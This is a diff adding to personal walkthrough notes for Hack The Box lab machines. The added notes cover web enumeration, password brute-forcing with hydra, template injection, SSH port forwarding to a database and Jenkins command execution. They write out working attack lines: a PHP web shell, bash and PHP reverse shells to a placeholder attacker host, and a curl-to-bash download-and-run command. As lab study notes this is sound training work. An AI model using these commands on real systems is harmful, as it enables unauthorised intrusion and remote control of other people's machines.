@@ -118,7 +118,79 @@ Use AWS CLI to list S3 files using found S3 endpoint
 
 Create PHP Reverse Shell and upload it to web server via S3
 `<?php system($_GET["cmd"]); ?>`
-More advanced Reverse Shell at
-https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php
-Or Interactive Reverse Shell at
-https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell-one-liner
+Confirm Reverse Shell works
+http://thetoppers.htb/?cmd=id
+    More advanced Reverse Shell at
+    https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php
+    Or Interactive Reverse Shell at
+    https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell-one-liner
+    
+
+Upgrade to Interactive Reverse Shell
+    Or others
+    https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp
+Create file on local host > shell.sh
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+```
+
+Serve file
+`python -m http.server 8000`
+Spawn Netcat to expect incoming connections
+`nc -nvlp 1337`
+Using Reverse Shell, get target to download and execute reverse Shell
+`http://thetoppers.htb/?cmd=curl%2010.10.14.74:8000/shell.sh|bash`
+
+Alternatively directly spawn reverse Shell from PHP:
+```php
+<?php
+    // Start a listener on the attacker's machine
+    $sock=fsockopen("attacker-ip", 4444);
+    exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+```
+
+Once Connected using Netcat, upgrade to nicer interactive Shell
+`python3 -c “import pty;pty.spawn(‘/bin/bash’)”`
+
+### Ignition
+
+Enumerate Subdirectories
+`gobuster dir --url http://ignition.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
+
+Crack Login at Magento Login page
+Couldn't get it to work
+`hydra -l admin -P /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt ignition.htb http-post-form "/admin:username=^USER^&login=^PASS^:disabled" -v`
+
+### Bike
+Use `Wappalyzer` Chrome Extension to check used technologies
+Using Hacktricks SSTI [Identificaton by Payload](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#identification-by-payloads) find the correct Templating Engine
+Enter `{{7*7}}` into input field to check for Server Side Template Injection
+Using Burp Suite's Repeater and Decoder, take Hacktrick's Payload (URL Encoded) and submit it.
+Keep massaging until code execution is achieved.
+
+
+### Funnel
+Nmap Scan, FTP Anonymous, Default Passwords, Hydra SSH + FTP, SSH Access. Local Postgresql db found via htop
+List locally listening ports using `ss -tl` or without resolving names `ss -tln`
+Port forward 5432 to attacker using 
+`ssh -N -L [local_port]:localhost:[destination_port] [username]@[ssh_server]`
+In this case: `ssh -N -L 5432:localhost:5432 christine@10.1.2.3`
+Then start psql locally using `psql -h localhost -p 5432 --user christine`
+
+    Could also have used Dynamic Port Forwarding (SOCKS5) using Proxychains (configurable at `/etc/proxychains4.conf`)
+
+Within `psql`
+`\l` list all tablespaces
+`\c secrets` change to secrets database
+`\d` list tables
+`select * from flag;`
+
+### Pennyworth
+Does not work: `hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt 10.129.197.213 -s 8080 http-post-form "/:j_username=^USER^&j_password=^PASS^:Invalid" -v`
+Web Server's Anti-CSRF Protection triggers and doesn't accept Hydra's Input
+Jenkins Web Interface allows executing arbitrary commands on host using Dashboard > Nodes > master > Script Console
+
+### Tactics
+
